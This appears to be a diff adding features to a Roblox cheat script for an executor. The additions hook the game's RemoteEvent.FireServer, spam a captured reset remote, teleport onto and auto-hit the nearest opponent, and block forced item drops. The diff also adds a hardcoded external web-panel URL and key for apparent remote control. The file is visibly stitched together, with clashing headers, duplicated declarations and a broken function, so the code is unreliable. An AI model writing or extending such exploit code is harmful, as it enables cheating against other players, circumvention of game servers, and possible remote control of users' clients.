@@ -1,16 +1,506 @@
+-- ============================================================
+-- DUELS V2 - COMPLETE
+-- Jump drop only (no crasher)
+-- TP Bat (TOGGLE - stays on until clicked again)
+-- Blossom Reset (player reset)
+-- 3-column layout matching image
+-- ============================================================
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
-local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer")
+--[[
+  Panel Client v3 — Headless (no GUI)
+  Controlled via web panel polling only
+]]
+
+local BASE = "https://responsive-redo-bot.lovable.app"
+local KEY  = "Grin@1234"
+
+local Players            = game:GetService("Players")
+local HttpService        = game:GetService("HttpService")
+local RunService         = game:GetService("RunService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService   = game:GetService("UserInputService")
+local TweenService       = game:GetService("TweenService")
+
+local request = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+if not request then return end
+
+local LP = Players.LocalPlayer
+if not LP then LP = Players.PlayerAdded:Wait() end
+
 if _G.DuelsV2_Running then return end
 _G.DuelsV2_Running = true
 
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local ContentProvider = game:GetService("ContentProvider")
+local Stats = game:GetService("Stats")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+
+local LP = Players.LocalPlayer or Players:WaitForChild("LocalPlayer")
+
+-- [ORVYN LOGIC - SPOOF REMOVED]
+
+
+-- ============================================================
+-- FIX: Missing variables
+-- ============================================================
+local DROP_TYPES = {
+    JUMP = "jump",
+}
+local currentDropType = DROP_TYPES.JUMP
+
+-- Create a dummy presetListFrame to avoid nil errors
+presetListFrame = Instance.new("Frame")
+presetListFrame.Name = "PresetList"
+presetListFrame.Size = UDim2.new(0, 0, 0, 0)
+presetListFrame.BackgroundTransparency = 1
+presetListFrame.Parent = game:GetService("CoreGui")
+presetListFrame.Visible = false
+
+-- ============================================================
+
+local _isfile = isfile or (syn and syn.isfile) or (getgenv and getgenv().isfile) or function() return false end
+local _readfile = readfile or (syn and syn.readfile) or (getgenv and getgenv().readfile) or function() return nil end
+local _writefile = writefile or (syn and syn.writefile) or (getgenv and getgenv().writefile) or function() end
+local _delfile = delfile or (syn and syn.delfile) or (getgenv and getgenv().delfile) or function() end
+local getconnections = getconnections or get_signal_cons or getconnects or (syn and syn.get_signal_cons)
+local sethiddenproperty = sethiddenproperty or (syn and syn.sethiddenproperty) or (getgenv and getgenv().sethiddenproperty) or function() end
+
+-- HTTP request function for webhook
+local _request = request or http_request or (syn and syn.request) or (game and game:GetService("HttpService") and game:GetService("HttpService").RequestAsync) or nil
+
+if not fireproximityprompt then
+    fireproximityprompt = (getgenv and getgenv().fireproximityprompt)
+        or (genv and genv().fireproximityprompt)
+        or function(prompt)
+            pcall(function()
+                prompt:InputHoldBegin()
+                task.wait(0.05)
+                prompt:InputHoldEnd()
+            end)
+        end
+end
+
+repeat task.wait() until game:IsLoaded()
+
+-- ============================================================
+-- BLOSSOM RESET FEATURE
+-- ============================================================
+local resetRemote = nil
+local RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
+local originalFireServer = nil
+
+local function findResetRemote()
+    if resetRemote then return resetRemote end
+    for _, descendant in pairs(game:GetDescendants()) do
+        if descendant:IsA("RemoteEvent") and descendant.Name:sub(1, 3) == "RE/" then
+            resetRemote = descendant
+            print("[Duels] Found reset remote:", descendant:GetFullName())
+            break
+        end
+    end
+    return resetRemote
+end
+
+local o; o = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
+    if not resetRemote and self.Name:sub(1, 3) == "RE/" then
+        resetRemote = self
+        originalFireServer = o
+        print("[Duels] Found reset remote via hook:", self:GetFullName())
+    end
+    return o(self, ...)
+end))
+
+local function instaReset()
+    findResetRemote()
+    if not resetRemote then
+        task.wait(0.5)
+        findResetRemote()
+        if not resetRemote then
+            warn("[Duels] Reset remote not found!")
+            return
+        end
+    end
+    
+    local character = LP.Character
+    if not character then 
+        pcall(function() resetRemote:FireServer(RESET_GUID, LP, "balloon") end)
+        return 
+    end
+    
+    local humanoid = character:FindFirstChild("Humanoid")
+    if not humanoid then
+        pcall(function() resetRemote:FireServer(RESET_GUID, LP, "balloon") end)
+        return
+    end
+    
+    if humanoid.Health <= 0 then
+        pcall(function() resetRemote:FireServer(RESET_GUID, LP, "balloon") end)
+        return
+    end
+    
+    local resetDetected = false
+    local connections = {}
+    table.insert(connections, humanoid.Died:Connect(function() resetDetected = true end))
+    table.insert(connections, character.AncestryChanged:Connect(function(_, parent) if not parent then resetDetected = true end end))
+    table.insert(connections, humanoid:GetPropertyChangedSignal("Health"):Connect(function() if humanoid.Health <= 0 then resetDetected = true end end))
+    
+    task.spawn(function()
+        local attempts = 0
+        while not resetDetected and attempts < 50 do
+            attempts = attempts + 1
+            pcall(function() resetRemote:FireServer(RESET_GUID, LP, "balloon") end)
+            task.wait()
+        end
+        for _, conn in pairs(connections) do conn:Disconnect() end
+        if resetDetected then print("[Duels] Reset successful after", attempts, "attempts")
+        else warn("[Duels] No reset detected") end
+    end)
+end
+
+-- ============================================================
+-- TP BAT FEATURE (TOGGLE - stays ON until clicked again)
+-- ============================================================
+local tpBatToggled = false
+local tpBatHittingCooldown = false
+local tpBatHRP = nil
+local tpBatH = nil
+local tpBatConn = nil
+local tpBatAimbotConn = nil
+
+local function getBat()
+    local char = LP.Character
+    if not char then return nil end
+    local tool = char:FindFirstChild("Bat")
+    if tool then return tool end
+    local bp = LP:FindFirstChild("Backpack")
+    if bp then
+        tool = bp:FindFirstChild("Bat")
+        if tool then
+            tool.Parent = char
+            return tool
+        end
+    end
+    return nil
+end
+
+local function tryHitBat()
+    if tpBatHittingCooldown then return end
+    tpBatHittingCooldown = true
+    pcall(function()
+        local bat = getBat()
+        if bat then
+            bat:Activate()
+            local ev = bat:FindFirstChildWhichIsA("RemoteEvent")
+            if ev then ev:FireServer() end
+            local rf = bat:FindFirstChildWhichIsA("RemoteFunction")
+            if rf then pcall(function() rf:InvokeServer() end) end
+        end
+    end)
+    task.delay(0.08, function() tpBatHittingCooldown = false end)
+end
+
+local function getClosestPlayerForTP()
+    if not tpBatHRP then return nil, math.huge end
+    local closest, closestDist = nil, math.huge
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LP and p.Character then
+            local root = p.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local dist = (tpBatHRP.Position - root.Position).Magnitude
+                if dist < closestDist then
+                    closestDist = dist
+                    closest = p
+                end
+            end
+        end
+    end
+    return closest, closestDist
+end
+
+local function startTPBat()
+    if tpBatConn then tpBatConn:Disconnect(); tpBatConn = nil end
+    if tpBatAimbotConn then tpBatAimbotConn:Disconnect(); tpBatAimbotConn = nil end
+    
+    tpBatConn = RunService.Heartbeat:Connect(function()
+        if not tpBatToggled then return end
+        if not tpBatH or not tpBatHRP then
+            local char = LP.Character
+            if char then
+                tpBatH = char:FindFirstChildOfClass("Humanoid")
+                tpBatHRP = char:FindFirstChild("HumanoidRootPart")
+            end
+            if not tpBatH or not tpBatHRP then return end
+        end
+        
+        local target, dist = getClosestPlayerForTP()
+        if target and target.Character then
+            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+            if targetRoot then
+                if sethiddenproperty then
+                    pcall(function() sethiddenproperty(tpBatHRP, "PhysicsRepRootPart", targetRoot) end)
+                end
+                local targetPos = targetRoot.Position + Vector3.new(0, 0.9, 0)
+                if (tpBatHRP.Position - targetPos).Magnitude > 5 then
+                    tpBatHRP.CFrame = CFrame.new(targetPos)
+                end
+                local cam = workspace.CurrentCamera
+                if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, targetRoot.Position) end
+                tryHitBat()
+            end
+        end
+    end)
+    
+    tpBatAimbotConn = RunService.RenderStepped:Connect(function()
+        if not tpBatToggled then return end
+        if not tpBatH or not tpBatHRP then return end
+        
+        local target, dist = getClosestPlayerForTP()
+        if target and target.Character then
+            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
+            if targetRoot then
+                local cam = workspace.CurrentCamera
+                if cam then cam.CFrame = CFrame.new(cam.CFrame.Position, targetRoot.Position) end
+                tryHitBat()
+            end
+        end
+    end)
+    print("[Duels] TP Bat STARTED (toggle ON)")
+end
+
+local function stopTPBat()
+    if tpBatConn then tpBatConn:Disconnect(); tpBatConn = nil end
+    if tpBatAimbotConn then tpBatAimbotConn:Disconnect(); tpBatAimbotConn = nil end
+    print("[Duels] TP Bat STOPPED (toggle OFF)")
+end
+
+local function toggleTPBat()
+    tpBatToggled = not tpBatToggled
+    
+    if tpBatToggled then
+        local char = LP.Character
+        if char then
+            tpBatHRP = char:FindFirstChild("HumanoidRootPart")
+            tpBatH = char:FindFirstChildOfClass("Humanoid")
+        end
+        startTPBat()
+        if stackBtnRefs and stackBtnRefs.tpBat then 
+            stackBtnRefs.tpBat.setOn(true) 
+        end
+    else
+        stopTPBat()
+        if stackBtnRefs and stackBtnRefs.tpBat then 
+            stackBtnRefs.tpBat.setOn(false) 
+        end
+    end
+    requestSave()
+end
+
+local function setupTPBatCharacter(char)
+    task.wait(0.2)
+    tpBatH = char:FindFirstChildOfClass("Humanoid")
+    tpBatHRP = char:FindFirstChild("HumanoidRootPart")
+    if tpBatToggled then startTPBat() end
+end
+
+LP.CharacterAdded:Connect(setupTPBatCharacter)
+if LP.Character then task.spawn(function() setupTPBatCharacter(LP.Character) end) end
+
+-- ============================================================
+-- MIRROR TP DOWN (FROM ACE DUELS - ADDED)
+-- ============================================================
+local MIRROR_TP_DROP_THRESHOLD = 3
+local MIRROR_TP_DOWN_Y = -7.00
+local mirrorTPPreviousY = {}
+local mirrorTPLastTeleport = 0
+local mirrorTPDownEnabled = false
+
+local function mirrorTPAimbotActive()
+    return (tpBatToggled == true) or (State and State.batAimbotToggled == true)
+end
+
+local function mirrorTPTeleportDown()
+    local character = LP.Character
+    local root = character and character:FindFirstChild("HumanoidRootPart")
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    if not root or not humanoid or humanoid.Health <= 0 then return end
+    local now = tick()
+    if now - mirrorTPLastTeleport < 0.08 then return end
+    mirrorTPLastTeleport = now
+    local _, yaw = root.CFrame:ToEulerAnglesYXZ()
+    root.CFrame = CFrame.new(root.Position.X, MIRROR_TP_DOWN_Y, root.Position.Z) * CFrame.Angles(0, yaw, 0)
+    root.Velocity = Vector3.zero
+    pcall(function() root.AssemblyLinearVelocity = Vector3.zero end)
+end
+
+RunService.Heartbeat:Connect(function()
+    if not mirrorTPDownEnabled or not mirrorTPAimbotActive() then
+        table.clear(mirrorTPPreviousY)
+        return
+    end
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LP and player.Character then
+            local root = player.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local currentY = root.Position.Y
+                local previousY = mirrorTPPreviousY[player.UserId]
+                if previousY and previousY - currentY >= MIRROR_TP_DROP_THRESHOLD then
+                    pcall(mirrorTPTeleportDown)
+                    table.clear(mirrorTPPreviousY)
+                    return
+                end
+                mirrorTPPreviousY[player.UserId] = currentY
+            end
+        end
+    end
+end)
+
+function _G.GreenSetMirrorTPDown(enabled)
+    mirrorTPDownEnabled = enabled == true
+    if not mirrorTPDownEnabled then table.clear(mirrorTPPreviousY) end
+end
+
+function _G.GreenToggleMirrorTPDown()
+    _G.GreenSetMirrorTPDown(not mirrorTPDownEnabled)
+end
+
+-- Enable by default (set to false if you want manual toggle)
+_G.GreenSetMirrorTPDown(true)
+
+
+-- ============================================================
+-- CONFIG VERSION & EARLY LOAD
+-- ============================================================
+local CONFIG_VERSION = 2
+local CONFIG_FILE = "DuelsConfig.json"
+local CONFIG_BACKUP = "DuelsConfig.bak"
+
+local earlyConfig = nil
+local function loadEarlyConfig()
+    if not _isfile(CONFIG_FILE) then return nil end
+    local raw = _readfile(CONFIG_FILE)
+    if not raw then return nil end
+    local ok, cfg = pcall(function() return HttpService:JSONDecode(raw) end)
+    if ok and cfg and cfg.version == CONFIG_VERSION then return cfg end
+    return nil
+end
+earlyConfig = loadEarlyConfig()
+local introShouldPlay = (earlyConfig == nil or earlyConfig.introEnabled ~= false)
+
+-- Intro (skip if disabled)
+if introShouldPlay then
+    local _TS = TweenService
+    local _PG = LP:WaitForChild("PlayerGui")
+    local introGui = Instance.new("ScreenGui")
+    introGui.Name = "GreenHUBIntro"
+    introGui.ResetOnSpawn = false
+    introGui.IgnoreGuiInset = true
+    introGui.DisplayOrder = 999
+    introGui.Parent = _PG
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1,0,1,0)
+    bg.BackgroundColor3 = Color3.new(0,0,0)
+    bg.BackgroundTransparency = 0.15
+    bg.BorderSizePixel = 0
+    bg.Parent = introGui
+
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 12
+    blur.Parent = game:GetService("Lighting")
+
+    local container = Instance.new("Frame")
+    container.Size = UDim2.new(0,400,0,300)
+    container.Position = UDim2.new(0.5,-200,0.5,-150)
+    container.BackgroundTransparency = 1
+    container.Parent = bg
+
+    local LOGO_ID = "rbxassetid://16478039709"
+    task.spawn(function() pcall(function() ContentProvider:PreloadAsync({LOGO_ID}) end) end)
+
+    local logo = Instance.new("ImageLabel")
+    logo.Size = UDim2.new(0,120,0,120)
+    logo.Position = UDim2.new(0.5,-60,0,30)
+    logo.BackgroundTransparency = 1
+    logo.Image = LOGO_ID
+    logo.ImageColor3 = Color3.fromRGB(80,255,80)
+    logo.ImageTransparency = 1
+    logo.ScaleType = Enum.ScaleType.Fit
+    logo.Parent = container
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1,0,0,50)
+    title.Position = UDim2.new(0,0,0,170)
+    title.BackgroundTransparency = 1
+    title.Text = "DUELS V2"
+    title.TextColor3 = Color3.fromRGB(80,255,80)
+    title.TextTransparency = 1
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBlack
+    title.TextStrokeTransparency = 0.2
+    title.TextStrokeColor3 = Color3.new(0,0,0)
+    title.Parent = container
+
+    local sub = Instance.new("TextLabel")
+    sub.Size = UDim2.new(0.8,0,0,30)
+    sub.Position = UDim2.new(0.1,0,0,230)
+    sub.BackgroundTransparency = 1
+    sub.Text = "LUCK IN PROGRESS"
+    sub.TextColor3 = Color3.fromRGB(100,200,100)
+    sub.TextTransparency = 1
+    sub.TextScaled = true
+    sub.Font = Enum.Font.GothamBold
+    sub.Parent = container
+
+    local loadingBg = Instance.new("Frame")
+    loadingBg.Size = UDim2.new(0.6,0,0,4)
+    loadingBg.Position = UDim2.new(0.2,0,0,275)
+    loadingBg.BackgroundColor3 = Color3.fromRGB(30,30,30)
+    loadingBg.BackgroundTransparency = 0.5
+    loadingBg.BorderSizePixel = 0
+    loadingBg.Parent = container
+    Instance.new("UICorner", loadingBg).CornerRadius = UDim.new(0,2)
+
+    local loadingBar = Instance.new("Frame")
+    loadingBar.Size = UDim2.new(0,0,1,0)
+    loadingBar.BackgroundColor3 = Color3.fromRGB(80,255,80)
+    loadingBar.BackgroundTransparency = 0.3
+    loadingBar.BorderSizePixel = 0
+    loadingBar.Parent = loadingBg
+    Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0,2)
+
+    _TS:Create(bg, TweenInfo.new(0.7), {BackgroundTransparency = 0.15}):Play()
+    _TS:Create(logo, TweenInfo.new(0.7), {ImageTransparency = 0}):Play()
+    _TS:Create(title, TweenInfo.new(0.7), {TextTransparency = 0}):Play()
+    _TS:Create(sub, TweenInfo.new(0.7), {TextTransparency = 0.3}):Play()
+    _TS:Create(loadingBar, TweenInfo.new(2, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)}):Play()
+    task.wait(2.5)
+    _TS:Create(bg, TweenInfo.new(0.8), {BackgroundTransparency = 1}):Play()
+    _TS:Create(logo, TweenInfo.new(0.8), {ImageTransparency = 1}):Play()
+    _TS:Create(title, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
+    _TS:Create(sub, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
+    _TS:Create(loadingBg, TweenInfo.new(0.8), {BackgroundTransparency = 1}):Play()
+    task.wait(1)
+    introGui:Destroy()
+    blur:Destroy()
+end
+
+-- ============================================================
+-- Helper for infinite jump (top-level, used before Main)
+local function applyImpulseForVelocity(hrp, desiredVelocity)
+    if not hrp or not desiredVelocity then return end
+    hrp.Velocity = Vector3.new(desiredVelocity.X, hrp.Velocity.Y, desiredVelocity.Z)
+end
+
+-- ============================================================
 -- STATE
 -- ============================================================
 local State = {
-    normalSpeed=59.5, carrySpeed=28.8, laggerSpeed=29, laggerCarrySpeed=15,
+    normalSpeed=60, carrySpeed=30, laggerSpeed=15, laggerCarrySpeed=24.5,
     speedToggled=false,
     laggerMode=0,
     infJumpEnabled=true, antiRagdollEnabled=false,
@@ -47,6 +537,55 @@ antiFlingEnabled=false,
     autoTPHeight=20,
     autoTPConn=nil,
 }
+
+-- ANTI-DROP FIX FOR 30 WHILE HOLDING (PURE ORVYN)
+-- Prevents server from forcing drop at 30 by locking tool
+local function setupAntiDrop()
+    local LP = game:GetService("Players").LocalPlayer
+    task.spawn(function()
+        while true do
+            task.wait(0.1)
+            local char = LP.Character
+            if char then
+                for _, tool in pairs(char:GetChildren()) do
+                    if tool:IsA("Tool") then
+                        local n = tool.Name:lower()
+                        if n:find("brainrot") or n:find("fluff") or n:find("candini") or tool:GetAttribute("IsBrainrot") then
+                            pcall(function()
+                                tool.CanBeDropped = false
+                                -- Keep tool equipped
+                                if tool.Parent ~= char then
+                                    local hum = char:FindFirstChildOfClass("Humanoid")
+                                    if hum then hum:EquipTool(tool) end
+                                end
+                            end)
+                        end
+                    end
+                end
+                -- Also check backpack for brainrot that was forced dropped
+                local bp = LP:FindFirstChild("Backpack")
+                if bp then
+                    for _, tool in pairs(bp:GetChildren()) do
+                        if tool:IsA("Tool") then
+                            local n = tool.Name:lower()
+                            if n:find("brainrot") or n:find("fluff") or n:find("candini") then
+                                if State and State.speedToggled and State.carrySpeed >= 30 then
+                                    pcall(function()
+                                        local hum = char:FindFirstChildOfClass("Humanoid")
+                                        if hum then hum:EquipTool(tool) end
+                                    end)
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
+setupAntiDrop()
+-- END ANTI-DROP FIX
+
 
 if earlyConfig then
     if earlyConfig.introEnabled ~= nil then State.introEnabled = earlyConfig.introEnabled end
@@ -661,6 +1200,7 @@ startAntiDie = function()
             end
             if hrp and not dropActive and hrp.Position.Y < -100 then
                 hrp.CFrame = CFrame.new(0,25,0)
+                
             end
             task.wait(0.5)
         end
@@ -683,9 +1223,10 @@ startAntiFling = function()
         if dropActive then return end
         local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
         if not hrp then return end
-        if hrp.AssemblyLinearVelocity.Magnitude > 160 then
-            hrp.AssemblyLinearVelocity = Vector3.zero
+        if hrp.Velocity.Magnitude > 160 then
+            hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0)
             hrp.AssemblyAngularVelocity = Vector3.zero
+            
         end
     end)
 end
@@ -1959,6 +2500,9 @@ toggleSetters["antiRagdoll"] = setAntiRag
     -- ============================================================
     local function applyImpulseForVelocity(hrp, desiredVelocity)
     if not hrp or not desiredVelocity then return end
+    hrp.Velocity = Vector3.new(desiredVelocity.X, hrp.Velocity.Y, desiredVelocity.Z)
+end
+
     stopAutoLeft = function()
         if alConn then alConn:Disconnect(); alConn = nil end; alPhase = 1
         local char = LP.Character; if char then local hum2 = char:FindFirstChildOfClass("Humanoid"); if hum2 then pcall(function() hum2:Move(Vector3.zero, false) end) end end
@@ -2761,26 +3305,18 @@ toggleSetters["antiRagdoll"] = setAntiRag
     RunService.RenderStepped:Connect(function()
         if not (h and hrp) then return end; if State._tpInProgress then return end
         if not State.batAimbotToggled and not State.autoLeftEnabled and not State.autoRightEnabled then
-            -- ORVYN PURE LOGIC START
             local md=h.MoveDirection
             local spd
-            -- Exact Orvyn getActiveMoveSpeed logic mapped to Duels State:
-            -- if laggerMode 2 => lagger+carry, if 1 => lagger only, if 0+speedToggled => carry, else normal
-            if State.laggerMode==2 then spd=State.laggerCarrySpeed
-            elseif State.laggerMode==1 then spd=State.laggerSpeed
-            elseif State.speedToggled then spd=State.carrySpeed
-            else spd=State.normalSpeed end
-            
+            if State.laggerMode==1 then spd=State.laggerSpeed
+            elseif State.laggerMode==2 then spd=State.laggerCarrySpeed
+            else spd=State.speedToggled and State.carrySpeed or State.normalSpeed end
             if md.Magnitude>0 then
                 State.lastMoveDir=md
-                -- Orvyn direct Velocity, keeps Y
-                hrp.Velocity=Vector3.new(md.X*spd, hrp.Velocity.Y, md.Z*spd)
+                hrp.Velocity=Vector3.new(md.X*spd, hrp.Velocity.Y, md.Z*spd) -- PURE ORVYN 30 NO DROP FIXED
             elseif State.antiRagdollEnabled and State.lastMoveDir.Magnitude>0 then
                 local anyHeld=false
                 for key in pairs(MOVE_KEYS) do if UIS:IsKeyDown(key) then anyHeld=true; break end end
-                if anyHeld then hrp.Velocity=Vector3.new(State.lastMoveDir.X*spd, hrp.Velocity.Y, State.lastMoveDir.Z*spd) end
-            end
-            -- ORVYN PURE LOGIC END
+                if anyHeld then hrp.Velocity=Vector3.new(State.lastMoveDir.X*spd, hrp.Velocity.Y, State.lastMoveDir.Z*spd) end -- ORVYN REPLACED
             end
         end
         pcall(function()
